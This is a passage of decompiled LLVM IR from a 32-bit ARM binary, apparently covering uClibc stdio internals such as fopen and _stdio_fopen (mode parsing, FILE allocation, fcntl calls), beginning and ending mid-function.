dec_label_pc_17a64:                               ; preds = %dec_label_pc_179f0, %dec_label_pc_179d8, %dec_label_pc_17a4c, %dec_label_pc_17a44
  %v0_17a64 = load i32, i32* @r5, align 4
  %v1_17a64 = inttoptr i32 %v0_17a64 to i16*
  %v2_17a64 = load i16, i16* %v1_17a64, align 2
  %v3_17a64 = zext i16 %v2_17a64 to i32
  store i32 %v3_17a64, i32* %r3.global-to-local, align 4
  %v1_17a68 = and i32 %v3_17a64, 16384
  %v2_17a68 = icmp eq i32 %v1_17a68, 0
  br i1 %v2_17a68, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_17a64
  %v2_17a6c = add i32 %v0_17a64, 8
  %v3_17a6c = inttoptr i32 %v2_17a6c to i32*
  %v4_17a6c = load i32, i32* %v3_17a6c, align 4
  store i32 %v4_17a6c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_17a64, %bb48
  %v1_17a70 = xor i1 %v2_17a68, true
  call void @__pseudo_cond_branch(i1 %v1_17a70, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17a78 = load i32, i32* @r8, align 4
  %v2_17a78 = add i32 %v0_17a78, 160
  %v3_17a78 = inttoptr i32 %v2_17a78 to i32*
  %v4_17a78 = load i32, i32* %v3_17a78, align 4
  store i32 %v4_17a78, i32* @r5, align 4
  %v1_17a7c = add i32 %v4_17a78, 8
  %v2_17a7c = inttoptr i32 %v1_17a7c to i32*
  %v3_17a7c = load i32, i32* %v2_17a7c, align 4
  store i32 %v3_17a7c, i32* %r3.global-to-local, align 4
  %v1_17a80 = load i32, i32* %sl.global-to-local, align 4
  %v3_17a80 = icmp uge i32 %v3_17a7c, %v1_17a80
  store i1 %v3_17a80, i1* %cpsr_c.global-to-local, align 1
  %v9_17a80 = icmp eq i32 %v3_17a7c, %v1_17a80
  br i1 %v9_17a80, label %dec_label_pc_17ac8, label %dec_label_pc_17a88

dec_label_pc_17a88:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_17a78, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17a9475 = inttoptr i32 %v4_17a78 to i32*
  %v2_17a9476 = load i32, i32* %v1_17a9475, align 4
  store i32 %v2_17a9476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17a9878 = icmp eq i32 %v2_17a9476, 0
  br i1 %v9_17a9878, label %dec_label_pc_17aa0, label %dec_label_pc_17ab8

dec_label_pc_17aa0:                               ; preds = %dec_label_pc_17a88, %dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge
  %v0_17aa079 = phi i32 [ %v1_17a98.pre, %dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge ], [ 0, %dec_label_pc_17a88 ]
  store i32 %v0_17aa079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17ab0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17ab0, label %dec_label_pc_17ab4, label %dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge

dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge:  ; preds = %dec_label_pc_17aa0
  %v0_17a94.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17a98.pre = load i32, i32* @r4, align 4
  %v1_17a94 = inttoptr i32 %v0_17a94.pre to i32*
  %v2_17a94 = load i32, i32* %v1_17a94, align 4
  store i32 %v2_17a94, i32* %r3.global-to-local, align 4
  %v3_17a98 = icmp uge i32 %v2_17a94, %v1_17a98.pre
  store i1 %v3_17a98, i1* %cpsr_c.global-to-local, align 1
  %v9_17a98 = icmp eq i32 %v2_17a94, %v1_17a98.pre
  br i1 %v9_17a98, label %dec_label_pc_17aa0, label %dec_label_pc_17ab8

dec_label_pc_17ab4:                               ; preds = %dec_label_pc_17aa0
  %v0_17ab4 = load i32, i32* @r4, align 4
  store i32 %v0_17ab4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17ab8

dec_label_pc_17ab8:                               ; preds = %dec_label_pc_17a88, %dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge, %dec_label_pc_17ab4
  %v0_17ab8 = phi i32 [ %v0_17ab4, %dec_label_pc_17ab4 ], [ %v2_17a9476, %dec_label_pc_17a88 ], [ %v2_17a94, %dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge ]
  %v1_17ab8 = phi i32 [ %v0_17ab4, %dec_label_pc_17ab4 ], [ 0, %dec_label_pc_17a88 ], [ %v1_17a98.pre, %dec_label_pc_17aa0.dec_label_pc_17a94_crit_edge ]
  %v3_17ab8 = icmp uge i32 %v0_17ab8, %v1_17ab8
  store i1 %v3_17ab8, i1* %cpsr_c.global-to-local, align 1
  %v9_17ab8 = icmp eq i32 %v0_17ab8, %v1_17ab8
  br i1 %v9_17ab8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_17ab8
  %v1_17abc = load i32, i32* @r5, align 4
  store i32 %v1_17abc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_17ab8, %bb50
  %v1_17ac0 = xor i1 %v9_17ab8, true
  call void @__pseudo_cond_branch(i1 %v1_17ac0, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_17ac4 = load i32, i32* %sl.global-to-local, align 4
  %v1_17ac4 = load i32, i32* @r5, align 4
  %v2_17ac4 = add i32 %v1_17ac4, 8
  %v3_17ac4 = inttoptr i32 %v2_17ac4 to i32*
  store i32 %v0_17ac4, i32* %v3_17ac4, align 4
  %v0_17acc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_17ac8

dec_label_pc_17ac8:                               ; preds = %bb49, %bb51
  %v0_17acc = phi i32 [ %v0_17a78, %bb49 ], [ %v0_17acc.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_17acc = add i32 %v0_17acc, 80
  %v3_17acc = inttoptr i32 %v2_17acc to i32*
  %v4_17acc = load i32, i32* %v3_17acc, align 4
  store i32 %v4_17acc, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_17ad4 = add i32 %v0_17acc, 160
  %v3_17ad4 = inttoptr i32 %v2_17ad4 to i32*
  %v4_17ad4 = load i32, i32* %v3_17ad4, align 4
  store i32 %v4_17ad4, i32* %r0.global-to-local, align 4
  %v1_17ad8 = inttoptr i32 %v4_17acc to i32*
  %v2_17ad8 = load i32, i32* %v1_17ad8, align 4
  store i32 %v2_17ad8, i32* %r3.global-to-local, align 4
  %v1_17adc = add i32 %v4_17ad4, 4
  %v2_17adc = inttoptr i32 %v1_17adc to i32*
  %v3_17adc = load i32, i32* %v2_17adc, align 4
  store i32 %v3_17adc, i32* %r1.global-to-local, align 4
  %v1_17ae0 = add i32 %v2_17ad8, 1
  store i32 %v1_17ae0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ae4 = icmp eq i32 %v3_17adc, 0
  store i32 %v1_17ae0, i32* %v1_17ad8, align 4
  br i1 %v2_17ae4, label %dec_label_pc_17af0, label %dec_label_pc_17b50

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17ac8
  %v0_17af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17af0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17af0 = add i32 %v1_17af0, 8
  %v3_17af0 = inttoptr i32 %v2_17af0 to i32*
  store i32 %v0_17af0, i32* %v3_17af0, align 4
  %v0_17af4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17af4, i32* @r5, align 4
  br label %dec_label_pc_17af8

dec_label_pc_17af8:                               ; preds = %dec_label_pc_17b28.dec_label_pc_17af8_crit_edge, %dec_label_pc_17af0
  %v0_17af8 = phi i32 [ %v0_17af8.pre, %dec_label_pc_17b28.dec_label_pc_17af8_crit_edge ], [ %v0_17af4, %dec_label_pc_17af0 ]
  %v1_17af8 = inttoptr i32 %v0_17af8 to i32*
  %v2_17af8 = load i32, i32* %v1_17af8, align 4
  store i32 %v2_17af8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17af8, i32* %r2.global-to-local, align 4
  %v2_17b0464 = load i32, i32* %v1_17af8, align 4
  store i32 %v2_17b0464, i32* %r3.global-to-local, align 4
  %v3_17b0866 = icmp uge i32 %v2_17b0464, %v2_17af8
  store i1 %v3_17b0866, i1* %cpsr_c.global-to-local, align 1
  %v9_17b0872 = icmp eq i32 %v2_17b0464, %v2_17af8
  br i1 %v9_17b0872, label %dec_label_pc_17b10, label %dec_label_pc_17b28

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17af8, %dec_label_pc_17b10.dec_label_pc_17b04_crit_edge
  %v0_17b1073 = phi i32 [ %v1_17b08.pre, %dec_label_pc_17b10.dec_label_pc_17b04_crit_edge ], [ %v2_17af8, %dec_label_pc_17af8 ]
  store i32 %v0_17b1073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17b20 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17b20, label %dec_label_pc_17b24, label %dec_label_pc_17b10.dec_label_pc_17b04_crit_edge

dec_label_pc_17b10.dec_label_pc_17b04_crit_edge:  ; preds = %dec_label_pc_17b10
  %v0_17b04.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17b08.pre = load i32, i32* @r4, align 4
  %v1_17b04 = inttoptr i32 %v0_17b04.pre to i32*
  %v2_17b04 = load i32, i32* %v1_17b04, align 4
  store i32 %v2_17b04, i32* %r3.global-to-local, align 4
  %v3_17b08 = icmp uge i32 %v2_17b04, %v1_17b08.pre
  store i1 %v3_17b08, i1* %cpsr_c.global-to-local, align 1
  %v9_17b08 = icmp eq i32 %v2_17b04, %v1_17b08.pre
  br i1 %v9_17b08, label %dec_label_pc_17b10, label %dec_label_pc_17b28

dec_label_pc_17b24:                               ; preds = %dec_label_pc_17b10
  %v0_17b24 = load i32, i32* @r4, align 4
  store i32 %v0_17b24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b28

dec_label_pc_17b28:                               ; preds = %dec_label_pc_17af8, %dec_label_pc_17b10.dec_label_pc_17b04_crit_edge, %dec_label_pc_17b24
  %v0_17b30 = phi i32 [ %v0_17b24, %dec_label_pc_17b24 ], [ %v2_17b0464, %dec_label_pc_17af8 ], [ %v2_17b04, %dec_label_pc_17b10.dec_label_pc_17b04_crit_edge ]
  %v1_17b28 = phi i32 [ %v0_17b24, %dec_label_pc_17b24 ], [ %v2_17af8, %dec_label_pc_17af8 ], [ %v1_17b08.pre, %dec_label_pc_17b10.dec_label_pc_17b04_crit_edge ]
  %v3_17b28 = icmp uge i32 %v0_17b30, %v1_17b28
  store i1 %v3_17b28, i1* %cpsr_c.global-to-local, align 1
  %v9_17b28 = icmp eq i32 %v0_17b30, %v1_17b28
  br i1 %v9_17b28, label %dec_label_pc_17b30, label %dec_label_pc_17b28.dec_label_pc_17af8_crit_edge

dec_label_pc_17b28.dec_label_pc_17af8_crit_edge:  ; preds = %dec_label_pc_17b28
  %v0_17af8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17af8

dec_label_pc_17b30:                               ; preds = %dec_label_pc_17b28
  %v2_17b30 = icmp ne i32 %v1_17b28, 0
  store i1 %v2_17b30, i1* %cpsr_c.global-to-local, align 1
  %v7_17b34 = icmp slt i32 %v1_17b28, 2
  br i1 %v7_17b34, label %dec_label_pc_17b50, label %dec_label_pc_17b38

dec_label_pc_17b38:                               ; preds = %dec_label_pc_17b30
  %v0_17b38 = load i32, i32* @r5, align 4
  store i32 %v0_17b38, i32* %r0.global-to-local, align 4
  %v0_17b3c = load i32, i32* %r1.global-to-local, align 4
  %v1_17b3c = add i32 %v0_17b3c, 129
  store i32 %v1_17b3c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17b50

dec_label_pc_17b50:                               ; preds = %dec_label_pc_17ac8, %dec_label_pc_17b38, %dec_label_pc_17b30
  %v0_17b50 = call i32 @_stdio_openlist_dec_use()
  %v0_17b54 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17b54, i32* %r0.global-to-local, align 4
  %v2_17b5c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17b5c, i32* @r4, align 4
  store i32 %v6_17844, i32* @r5, align 4
  store i32 %v9_17844, i32* @r6, align 4
  store i32 %v12_17844, i32* @r7, align 4
  ret i32 %v0_17b54

; uselistorder directives
  uselistorder i32 %v0_17b24, { 1, 0, 2 }
  uselistorder i32 %v1_17b08.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17af8, { 1, 0 }
  uselistorder i32 %v0_17acc, { 1, 0 }
  uselistorder i32 %v0_17ab4, { 1, 0, 2 }
  uselistorder i32 %v1_17a98.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17a80, { 1, 0 }
  uselistorder i32 %v0_17a38, { 1, 0, 2 }
  uselistorder i32 %v1_17a1c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_179ac, { 1, 0, 2 }
  uselistorder i32 %v1_17990.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17980, { 1, 0 }
  uselistorder i32 %v0_1793c, { 1, 0, 2 }
  uselistorder i32 %v1_17920.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17900, { 1, 0 }
  uselistorder i32 %v1_1788c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 37, 15, 38, 10, 14, 9, 8, 13, 12, 11, 36, 35, 34, 33, 32, 31, 29, 30, 28, 27, 26, 25, 7, 6, 24, 23, 22, 21, 20, 19, 18, 17, 16, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_17b50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17b28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b10, { 1, 0 }
  uselistorder label %dec_label_pc_17ac8, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_17ab8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17aa0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_17a64, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_17a3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a24, { 1, 0 }
  uselistorder label %dec_label_pc_179d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_179b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17998, { 1, 0 }
  uselistorder label %dec_label_pc_17950, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_17940, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17928, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_178c8, { 1, 0 }
  uselistorder label %dec_label_pc_178bc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_178ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17894, { 1, 0 }
}

define i32 @function_17b68(i32 %arg1) local_unnamed_addr {
dec_label_pc_17b68:
  %v0_17b68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b68, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17b68
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17b68, %bb
  %v10_17b70 = phi i32 [ %arg1, %dec_label_pc_17b68 ], [ 0, %bb ]
  ret i32 %v10_17b70

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_17b84 = call i32 @_stdio_fopen()
  ret i32 %v0_17b84
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17b94 = load i32, i32* @r4, align 4
  store i32 %v3_17b94, i32* %stack_var_-24, align 4
  %v6_17b94 = load i32, i32* @r5, align 4
  %v9_17b94 = load i32, i32* @r6, align 4
  %v12_17b94 = load i32, i32* @r7, align 4
  %v15_17b94 = load i32, i32* @r8, align 4
  %v0_17b98 = load i32, i32* @r1, align 4
  %v1_17b98 = inttoptr i32 %v0_17b98 to i8*
  %v2_17b98 = load i8, i8* %v1_17b98, align 1
  %v2_17ba0 = icmp ugt i8 %v2_17b98, 113
  store i1 %v2_17ba0, i1* %cpsr_c.global-to-local, align 1
  %v7_17ba0 = icmp eq i8 %v2_17b98, 114
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r8, align 4
  %v0_17bac = load i32, i32* @r0, align 4
  store i32 %v0_17bac, i32* @r7, align 4
  %v0_17bb0 = load i32, i32* @r2, align 4
  store i32 %v0_17bb0, i32* @r5, align 4
  %v0_17bb4 = load i32, i32* @r3, align 4
  store i32 %v0_17bb4, i32* @r6, align 4
  br i1 %v7_17ba0, label %dec_label_pc_17c08, label %dec_label_pc_17bbc

dec_label_pc_17bbc:                               ; preds = %entry
  %v2_17bbc = icmp ugt i8 %v2_17b98, 118
  store i1 %v2_17bbc, i1* %cpsr_c.global-to-local, align 1
  %v7_17bbc = icmp eq i8 %v2_17b98, 119
  br i1 %v7_17bbc, label %bb, label %dec_label_pc_17bc8

bb:                                               ; preds = %dec_label_pc_17bbc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_17c0c

dec_label_pc_17bc8:                               ; preds = %dec_label_pc_17bbc
  %v2_17bc8 = icmp ugt i8 %v2_17b98, 96
  store i1 %v2_17bc8, i1* %cpsr_c.global-to-local, align 1
  %v7_17bc8 = icmp eq i8 %v2_17b98, 97
  br i1 %v7_17bc8, label %bb49, label %dec_label_pc_17bd4

bb49:                                             ; preds = %dec_label_pc_17bc8
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_17c0c

dec_label_pc_17bd4:                               ; preds = %dec_label_pc_17bc8, %dec_label_pc_17ca4, %dec_label_pc_17c78
  store i32 50540, i32* %r2.global-to-local, align 4
  %v0_17bd8 = call i32 @__aeabi_read_tp()
  store i32 %v0_17bd8, i32* %r0.global-to-local, align 4
  %v3_17bdc = load i16, i16* @global_var_24150.533, align 2
  %v4_17bdc = sext i16 %v3_17bdc to i32
  store i32 %v4_17bdc, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_17be4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17be4 = icmp eq i32 %v0_17be4, 0
  %v3_17be8 = add i32 %v4_17bdc, %v0_17bd8
  %v4_17be8 = inttoptr i32 %v3_17be8 to i32*
  store i32 22, i32* %v4_17be8, align 4
  br i1 %v2_17be4, label %dec_label_pc_17fac, label %dec_label_pc_17bf0

dec_label_pc_17bf0:                               ; preds = %dec_label_pc_17cc8._crit_edge, %dec_label_pc_17bd4
  %v0_17bf0 = load i32, i32* @r5, align 4
  %v1_17bf0 = inttoptr i32 %v0_17bf0 to i16*
  %v2_17bf0 = load i16, i16* %v1_17bf0, align 2
  %v3_17bf0 = zext i16 %v2_17bf0 to i32
  store i32 %v3_17bf0, i32* %r3.global-to-local, align 4
  %v1_17bf4 = and i32 %v3_17bf0, 8192
  %v2_17bf4 = icmp eq i32 %v1_17bf4, 0
  br i1 %v2_17bf4, label %dec_label_pc_17fac, label %dec_label_pc_17bfc

dec_label_pc_17bfc:                               ; preds = %dec_label_pc_17bf0
  store i32 %v0_17bf0, i32* @r0, align 4
  %v0_17c00 = call i32 @free()
  store i32 %v0_17c00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17fac

dec_label_pc_17c08:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_17c0c

dec_label_pc_17c0c:                               ; preds = %bb, %bb49, %dec_label_pc_17c08
  %v1_17c24 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_17c08 ]
  %v1_17c0c = add i32 %v0_17b98, 1
  %v2_17c0c = inttoptr i32 %v1_17c0c to i8*
  %v3_17c0c = load i8, i8* %v2_17c0c, align 1
  %v2_17c10 = icmp ugt i8 %v3_17c0c, 97
  store i1 %v2_17c10, i1* %cpsr_c.global-to-local, align 1
  %v7_17c10 = icmp eq i8 %v3_17c0c, 98
  %v1_17c0c.v0_17b98 = select i1 %v7_17c10, i32 %v1_17c0c, i32 %v0_17b98
  store i32 %v1_17c0c.v0_17b98, i32* %r3.global-to-local, align 4
  %v1_17c1c = add i32 %v1_17c0c.v0_17b98, 1
  %v2_17c1c = inttoptr i32 %v1_17c1c to i8*
  %v3_17c1c = load i8, i8* %v2_17c1c, align 1
  %v4_17c1c = zext i8 %v3_17c1c to i32
  store i32 %v4_17c1c, i32* @r3, align 4
  %v2_17c20 = icmp ugt i8 %v3_17c1c, 42
  store i1 %v2_17c20, i1* %cpsr_c.global-to-local, align 1
  %v7_17c20 = icmp eq i8 %v3_17c1c, 43
  br i1 %v7_17c20, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_17c0c
  store i32 %v1_17c24, i32* @r3, align 4
  %v2_17c28 = add nuw nsw i32 %v1_17c24, 1
  store i32 %v2_17c28, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17c0c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c2c = icmp eq i32 %v0_17bb0, 0
  br i1 %v2_17c2c, label %dec_label_pc_17c34, label %dec_label_pc_17c70

dec_label_pc_17c34:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_17c38 = call i32 @malloc()
  store i32 %v0_17c38, i32* %r0.global-to-local, align 4
  store i32 %v0_17c38, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_17c3c = icmp eq i32 %v0_17c38, 0
  br i1 %v3_17c3c, label %dec_label_pc_17fb0, label %dec_label_pc_17c44

dec_label_pc_17c44:                               ; preds = %dec_label_pc_17c34
  %v0_17c48 = load i32, i32* @r8, align 4
  %v2_17c48 = add i32 %v0_17c48, -33136
  store i32 %v2_17c48, i32* %r3.global-to-local, align 4
  %v1_17c4c = inttoptr i32 %v2_17c48 to i32*
  %v2_17c4c = load i32, i32* %v1_17c4c, align 4
  store i32 %v2_17c4c, i32* %r0.global-to-local, align 4
  %v3_17c4c = add i32 %v0_17c48, -33132
  %v4_17c4c = inttoptr i32 %v3_17c4c to i32*
  %v5_17c4c = load i32, i32* %v4_17c4c, align 4
  store i32 %v5_17c4c, i32* %r1.global-to-local, align 4
  %v6_17c4c = add i32 %v0_17c48, -33128
  %v7_17c4c = inttoptr i32 %v6_17c4c to i32*
  %v8_17c4c = load i32, i32* %v7_17c4c, align 4
  store i32 %v8_17c4c, i32* %r2.global-to-local, align 4
  %v2_17c58 = add i32 %v0_17c38, 8
  %v3_17c58 = inttoptr i32 %v2_17c58 to i32*
  store i32 0, i32* %v3_17c58, align 4
  %v2_17c60 = load i32, i32* @r5, align 4
  %v3_17c60 = inttoptr i32 %v2_17c60 to i16*
  store i16 8192, i16* %v3_17c60, align 2
  %v2_17c64 = load i32, i32* %r0.global-to-local, align 4
  %v0_17c68 = load i32, i32* @r5, align 4
  %v1_17c68 = add i32 %v0_17c68, 56
  store i32 %v1_17c68, i32* @r3, align 4
  %v1_17c6c = inttoptr i32 %v1_17c68 to i32*
  store i32 %v2_17c64, i32* %v1_17c6c, align 4
  %v3_17c6c = add i32 %v0_17c68, 60
  %v4_17c6c = inttoptr i32 %v3_17c6c to i32*
  %v5_17c6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c6c, i32* %v4_17c6c, align 4
  %v6_17c6c = add i32 %v0_17c68, 64
  %v7_17c6c = inttoptr i32 %v6_17c6c to i32*
  %v8_17c6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17c6c, i32* %v7_17c6c, align 4
  %v0_17c70.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17c70

dec_label_pc_17c70:                               ; preds = %.thread3, %dec_label_pc_17c44
  %v0_17cc8 = phi i32 [ %v0_17bb4, %.thread3 ], [ %v0_17c70.pre, %dec_label_pc_17c44 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_17c70 = icmp slt i32 %v0_17cc8, 0
  br i1 %v1_17c70, label %dec_label_pc_17cc8, label %dec_label_pc_17c78

dec_label_pc_17c78:                               ; preds = %dec_label_pc_17c70
  %v0_17c7c = load i32, i32* @r4, align 4
  %v2_17c7c = and i32 %v0_17c7c, 131075
  %v1_17c80 = add nuw nsw i32 %v2_17c7c, 1
  store i32 %v1_17c80, i32* %r2.global-to-local, align 4
  %v0_17c84 = load i32, i32* @r7, align 4
  %v1_17c84 = add i32 %v0_17c84, 1
  %v2_17c88 = and i32 %v1_17c84, %v1_17c80
  store i32 %v2_17c88, i32* %r3.global-to-local, align 4
  %v3_17c8c = icmp uge i32 %v2_17c88, %v1_17c80
  store i1 %v3_17c8c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c8c = icmp eq i32 %v2_17c88, %v1_17c80
  %v1_17c90 = load i32, i32* @r5, align 4
  %v2_17c90 = add i32 %v1_17c90, 4
  %v3_17c90 = inttoptr i32 %v2_17c90 to i32*
  store i32 %v0_17cc8, i32* %v3_17c90, align 4
  br i1 %v9_17c8c, label %dec_label_pc_17c98, label %dec_label_pc_17bd4

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c78
  %v0_17c98 = load i32, i32* @r4, align 4
  %v1_17c98 = load i32, i32* @r7, align 4
  %v2_17c98 = sub i32 -1, %v1_17c98
  %v3_17c98 = and i32 %v0_17c98, %v2_17c98
  store i32 %v3_17c98, i32* @r3, align 4
  %v1_17c9c = and i32 %v3_17c98, 1024
  %v2_17c9c = icmp eq i32 %v1_17c9c, 0
  br i1 %v2_17c9c, label %dec_label_pc_17cbc, label %dec_label_pc_17ca4

dec_label_pc_17ca4:                               ; preds = %dec_label_pc_17c98
  %v0_17ca4 = load i32, i32* @r6, align 4
  store i32 %v0_17ca4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_17cb0 = call i32 @__libc_fcntl(i32 %v0_17ca4, i32 4)
  store i32 %v2_17cb0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17cb4 = icmp eq i32 %v2_17cb0, 0
  br i1 %v2_17cb4, label %dec_label_pc_17ca4.dec_label_pc_17cbc_crit_edge, label %dec_label_pc_17bd4

dec_label_pc_17ca4.dec_label_pc_17cbc_crit_edge:  ; preds = %dec_label_pc_17ca4
  %v0_17cbc.pre = load i32, i32* @r7, align 4
  %v0_17cc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17ca4.dec_label_pc_17cbc_crit_edge, %dec_label_pc_17c98
  %v0_17cc0 = phi i32 [ %v0_17cc0.pre, %dec_label_pc_17ca4.dec_label_pc_17cbc_crit_edge ], [ %v0_17c98, %dec_label_pc_17c98 ]
  %v0_17cbc = phi i32 [ %v0_17cbc.pre, %dec_label_pc_17ca4.dec_label_pc_17cbc_crit_edge ], [ %v1_17c98, %dec_label_pc_17c98 ]
  %v1_17cbc = and i32 %v0_17cbc, 131072
  store i32 %v1_17cbc, i32* %r3.global-to-local, align 4
  %v2_17cc0 = or i32 %v1_17cbc, %v0_17cc0
  store i32 %v2_17cc0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17cec

dec_label_pc_17cc8:                               ; preds = %dec_label_pc_17c70
  %v2_17cc8 = icmp eq i32 %v0_17cc8, -1
  store i1 %v2_17cc8, i1* %cpsr_c.global-to-local, align 1
  %v7_17cc8 = icmp eq i32 %v0_17cc8, -1
  %v0_17cd4.pre = load i32, i32* @r4, align 4
  br i1 %v7_17cc8, label %dec_label_pc_17cc8._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_17cc8
  %v2_17ccc = or i32 %v0_17cd4.pre, 131072
  store i32 %v2_17ccc, i32* @r4, align 4
